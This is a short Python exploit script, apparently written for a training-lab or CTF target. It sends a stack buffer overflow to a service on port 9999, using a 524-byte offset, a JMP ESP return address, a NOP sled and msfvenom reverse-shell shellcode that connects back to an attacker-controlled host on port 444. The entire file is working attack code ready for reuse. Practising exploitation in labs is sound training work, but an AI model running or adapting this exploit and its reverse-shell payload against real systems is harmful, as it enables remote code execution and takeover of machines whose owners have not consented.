#!/usr/bin/env python3
#2025-01-22

import socket

ip = "10.10.201.76"
port = 9999

allchars = "".join([chr(i) for i in range(256)])  # Generate all characters from \x00 to \xff
badchars = "\x00\x0a"
usechars = "".join(c for c in allchars if c not in badchars) # Remove badchars from allchars
usechars = bytes(usechars, "latin-1")
#print(''.join(f'\\x{ord(c):02x}' for c in usechars))

# msfvenom --payload 'linux/x86/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=444 --format 'python' --bad-chars '\x00'
buf =  b""
buf += b"\xba\x72\xbf\x47\xc5\xda\xd9\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x12\x31\x56\x12\x83\xc6\x04\x03\x24"
buf += b"\xb1\xa5\x30\xf9\x16\xde\x58\xaa\xeb\x72\xf5\x4e"
buf += b"\x65\x95\xb9\x28\xb8\xd6\x29\xed\xf2\xe8\x80\x8d"
buf += b"\xba\x6f\xe2\xe5\x36\x85\x0b\x9a\x2e\xa7\x33\x65"
buf += b"\x13\x2e\xd2\xd5\x0d\x61\x44\x46\x61\x82\xef\x89"
buf += b"\x48\x05\xbd\x21\x3d\x29\x31\xd9\xa9\x1a\x9a\x7b"
buf += b"\x43\xec\x07\x29\xc0\x67\x26\x7d\xed\xba\x29"

offset = 524
overflow = b"A" * offset
retn = b"\xf3\x12\x17\x31" #311712f3 - pos of JMP ESP
padding = b"\x90" * 16  #space to expand in

#payload = usechars
payload = buf

buffer = overflow + retn + padding + payload + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))

  print("Sending payload...")
  s.send(buffer + b"\r\n") #add \r\n if can't recv data
  print("Done!")
  
except e:
  print("Exception: "+str(e))
